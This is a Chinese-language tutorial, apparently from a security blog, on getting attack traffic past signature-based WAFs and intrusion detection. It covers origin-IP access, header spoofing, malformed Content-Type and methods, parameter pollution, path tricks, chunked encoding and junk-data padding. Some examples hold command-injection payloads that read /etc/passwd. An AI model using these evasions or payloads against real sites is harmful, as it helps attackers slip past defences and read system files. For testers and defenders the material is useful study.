现在渗透的越来越难了，刚打的shell，过一会就没了，现在的流量设备，安全设备一个比一个流弊，payload一过去就面临着封禁，为了对抗设备，一些大佬们总结出很多绕过这种基于签名的*WAF 或 IDS* 的手法，为什么叫基于签名的？因为这种设备也是检查数据包中一些特征字符，比如什么and 1=1 什么的，但是肯定不会这么简单的，除了几个黑名单的固定的特征字符，很多都是那种通过正则去匹配特征字符的，这也是造成绕过可能性的原因。

直接通过真实ip访问

这是一种对待云waf最有效的办法，只要找到做cdn的之前的真实ip，那么直接通过ip访问，则会使云waf完全失效，web应用服务器失去云保护。

通过ip去访问一些网站，可能提示web页面找不到？ 

究其原因是，有些网站在路由上直接使用的域名为硬路由，这时候需要修改host 解析文件，把相关域名和真实ip 给对应上填上，再用域名去访问。
Default
linux host文件路径
/etc/hosts
 
windows host文件路径
C:\WINDOWS\system32\drivers\etc

切换协议

通过切换http到https，或者https切换到http，如果web站点没有进行强制https访问，那么http也能访问到其站点，如果waf错误配置，也能起到一点效果（方法比较特殊），还可以通过增加www，或者删除www前坠有时也管用。

通过IPv6 访问

有许多入侵检测系统也只监控 IPv4 流量，没有对IPv6 进行监控。
访问格式：http://[ipv6地址]:80/index.html
ipv6为：2001:470:c:1818::2
访问地址：http://[2001:470:c:1818::2]:80/index.html

对http包头进行修改

方法之一就是添加以下标头：
Default
    X-forwarded-for
    X-remote-IP
    X-originating-IP
    x-remote-addr
    x-client-ip

例如：
X-Originating-IP: 127.0.0.1

在一些做了访客流量负载的web架构很常见，他并不是把web服务器映射出去，而是把外面的访问流量通过一台流量转发机器转发到内网web应用服务器，这种形式的话，在转发进来的数据包中就会出现X-forwarded-for 等字段，标示着是哪个ip访问的web服务。

如果包存在：
Content-Type: text/html

那么可以尝试做以下修改：
Content-Type:           #直接删除类型值
Content-Type: text/htmlzzzzzzzzz   #错误的类型值
Content-Type: application/octet-stream #其他类型值

有时候将 MIME 类型设置为 multipart/form 数据然后对请求进行错误处理也有奇效。
Default
    Content-Type: multipart/form-data ; boundary=0000
    Content-Type: mUltiPart/ForM-dATa; boundary=0000
    Content-Type: multipart/form-datax; boundary=0000
    Content-Type: multipart/form-data, boundary=0000
    Content-Type: multipart/form-data boundary=0000
    Content-Type: multipart/whatever; boundary=0000
    Content-Type: multipart/; boundary=0000

对HTTP方法进行更改：
把get 改成post ，post改成get，或者直接改成put
有时候错误方法也能成功访问
请求可以通过“GETS”而不是“GET”发送，并且在许多情况下仍会按预期运行。

特别是在 PHP 中，根据配置，cookie 值可以被视为参数
Default
/cmd/a.php
 
cookie: cmd1=;cat /etc/passwd

还有的是就是把http协议 1.1 改成1.0 ，因为大部分服务器也支持1.0版本。

对参数操作

参数名称可以通过多种方式进行操作，具体服务器上运行的服务器端语言，还有取决于服务器的特性，这里讲一下php和asp的绕过。

1.通过硬编码值造成绕过
PHP 中的 **+**符号可用于实现此目的，而 ASP 中的 **%** 符号将实现类似的结果
在 ASP 中，可以将无效的 URL 编码添加到参数名称中（请注意，编码必须无效才能正常工作）
例子：
Default
/cmd/a.asp?%value=payload
/cmd/a.asp?%}9value=payload
 
/cmd/a.php?+value=payload

2. 多个参数（HTTP参数污染）

在php中，如果遇到多个参数，那么是从右到左来取参数值
Default
/cmd/a.php?value=1111111111111111111111111111&value=payload
 
/cmd/a.php?value=payload&value=payload
 
/cmd/a.php?page=cat /etc/passswd&page=
 
/cmd/a.php? page=cat&page=/etc/passswd&page=/passwd

在保证结果正确的情况下，想怎么玩就怎么玩

3.利用服务器特性

比如windows 的特性可以在文件名之后加_等符号，linux 加‘

通过控制字符

这些控制字符包括
Default
    %0d (CR)
    %0a (LF)
    %0d%0a (CRLF)
    %09
    %0B
    %00
例子：
Default
http://example.com/file.txt
改成：
http://example.com/file%00.txt

对于有一些waf很实用。

通过变换路径来bypass

一些waf 或者web应用通过web路由进行封禁，体现为访问某个特定的url路径为403 等状态。
但是通过url路径的特性，能进行绕过：
Default
/path//vuln.php 
/////////////////路径//////////////// vuln.php?value=PAYLOAD #在php中
/path/./vuln.php?value=PAYLOAD
/path/blah/../vuln.php?value=PAYLOAD 
/path/blah/blah/blah/../../../vuln.php?value=PAYLOAD 
/PaTh/VULN.PHP?VaLuE=PAYLOAD #windows大小写不分

通过中间件的特性，在 Apache Tomcat中：
Default
/path;/vuln.php?value=PAYLOAD
/path/;lol=lol/vuln.php?value=PAYLOAD

PATH_INFO（通过 Apache 设置的环境变量）
Default
/vuln/vuln.php/lolol?value=PAYLOAD 
/path/vuln.php;lol=lol?value=PAYLOAD

分块传输

注意：
1.只有HTTP/1.1支持分块传输
2.POST包都支持分块，不局限仅仅于反序列化和上传包
3.Transfer-Encoding: chunked大小写不敏感
Default
github：
https://github.com/c0ny1/chunked-coding-converter/releases/tag/0.4.0

通过burp chrunk插件分块编码传输
此方法主要是把一些关键字给拆开，当然你也可以通过手动编码进行调整，编码过程中长度需包括空格的长度，最后用0表示编码结束。

延时分块
Default
详情参考
https://gv7.me/articles/2021/java-deserialized-data-bypasses-waf-through-sleep-chunked/

垃圾数据

遇到什么waf，都是大包绕，绕不过，那就是包不够大，继续填充！！
并不是随意填充垃圾数据，而是填一些不影响结果的数据，比如遇到php站
Default
post参数为username=admin'

那么填充垃圾数据可为：
Default
username=11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111&username=admin'

填充到waf不再拦截为止。
还有通过语言的注释语句填充，例如如果是xml 上传，则可以使用xml中的注释语法
Default
<!-- 1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad1asdadad -->

把这样的语法放在payload前面，填充到bypass waf为止
如果是反序列化包，可以参考这篇文章
Default
https://gv7.me/articles/2021/java-deserialize-data-bypass-waf-by-adding-a-lot-of-dirty-data/